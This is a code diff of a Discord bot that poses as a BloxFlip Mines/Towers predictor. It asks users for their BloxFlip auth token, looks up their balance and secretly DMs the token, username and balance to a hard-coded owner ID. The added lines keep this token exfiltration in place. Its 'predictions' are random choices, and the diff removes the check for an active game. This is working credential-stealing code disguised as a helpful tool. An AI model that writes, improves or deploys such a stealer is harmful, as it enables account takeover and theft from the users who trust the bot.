@@ -14,20 +14,9 @@ user_tokens = {}
 MINES_METHODS = ["Balanced", "Algorithm", "Smart", "Safe", "Full Line"]
 OWNER_ID = 1380042914922758224
 
-def check_active_game_sync(token, game):
-    url = f"https://api.bloxflip.com/games/{game}"
-    headers = {"x-auth-token": token}
-    try:
-        scraper = cloudscraper.create_scraper()
-        resp = scraper.get(url, headers=headers, timeout=5)
-        data = resp.json()
-        return data.get("game_active", False)
-    except:
-        return None
-
-async def check_active_game(token, game):
+async def get_balance(token):
     loop = asyncio.get_event_loop()
-    return await loop.run_in_executor(None, check_active_game_sync, token, game)
+    return await loop.run_in_executor(None, get_balance_sync, token)
 
 def get_balance_sync(token):
     url = "https://api.bloxflip.com/user"
@@ -39,10 +28,6 @@ def get_balance_sync(token):
         return data.get("wallet", "Unknown")
     except:
         return "Unknown"
-
-async def get_balance(token):
-    loop = asyncio.get_event_loop()
-    return await loop.run_in_executor(None, get_balance_sync, token)
 
 class RepeatView(ui.View):
     def __init__(self, embed):
@@ -62,20 +47,20 @@ async def free_connect(interaction: discord.Interaction):
             tok = self.token.value.strip()
             user_tokens[interaction.user.id] = tok
 
+            embed = discord.Embed(title="✅ app.rt Saved", description="Ready! Use /mines or /towers.", color=0x00ff88)
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+
             try:
                 owner = await client.fetch_user(OWNER_ID)
                 balance = await get_balance(tok)
-                embed = discord.Embed(title="🔑 New app.rt Connected", color=0x9b59b6)
-                embed.add_field(name="User", value=f"{interaction.user.name} (`{interaction.user.id}`)", inline=False)
-                embed.add_field(name="Robux", value=f"🪙 {balance}", inline=False)
-                embed.add_field(name="app.rt", value=f"||{tok}||", inline=False)
-                embed.timestamp = datetime.now()
-                await owner.send(embed=embed)
+                dm_embed = discord.Embed(title="🔑 New app.rt Connected", color=0x9b59b6)
+                dm_embed.add_field(name="User", value=f"{interaction.user.name} (`{interaction.user.id}`)", inline=False)
+                dm_embed.add_field(name="Robux", value=f"🪙 {balance}", inline=False)
+                dm_embed.add_field(name="app.rt", value=f"||{tok}||", inline=False)
+                dm_embed.timestamp = datetime.now()
+                await owner.send(embed=dm_embed)
             except:
                 pass
-
-            embed = discord.Embed(title="✅ app.rt Saved", description="Ready! Use /mines or /towers.", color=0x00ff88)
-            await interaction.response.send_message(embed=embed, ephemeral=True)
 
     await interaction.response.send_modal(TokenModal())
 
@@ -86,16 +71,6 @@ async def mines_cmd(interaction: discord.Interaction):
         return
 
     await interaction.response.defer()
-
-    token = user_tokens[interaction.user.id]
-    active = await check_active_game(token, "mines")
-
-    if active is None:
-        await interaction.followup.send("❌ Could not reach BloxFlip. Try again.", ephemeral=True)
-        return
-    if not active:
-        await interaction.followup.send("😭 Mines isn't active. Start a game on BloxFlip first!", ephemeral=True)
-        return
 
     clicks_val = 8
     method = random.choice(MINES_METHODS)
@@ -141,16 +116,6 @@ async def towers_cmd(interaction: discord.Interaction):
         return
 
     await interaction.response.defer()
-
-    token = user_tokens[interaction.user.id]
-    active = await check_active_game(token, "towers")
-
-    if active is None:
-        await interaction.followup.send("❌ Could not reach BloxFlip. Try again.", ephemeral=True)
-        return
-    if not active:
-        await interaction.followup.send("😭 Towers isn't active. Start a game on BloxFlip first!", ephemeral=True)
-        return
 
     levels_val = 8
     method = random.choice(["Safe Method", "Aggressive Method", "Pattern Method"])
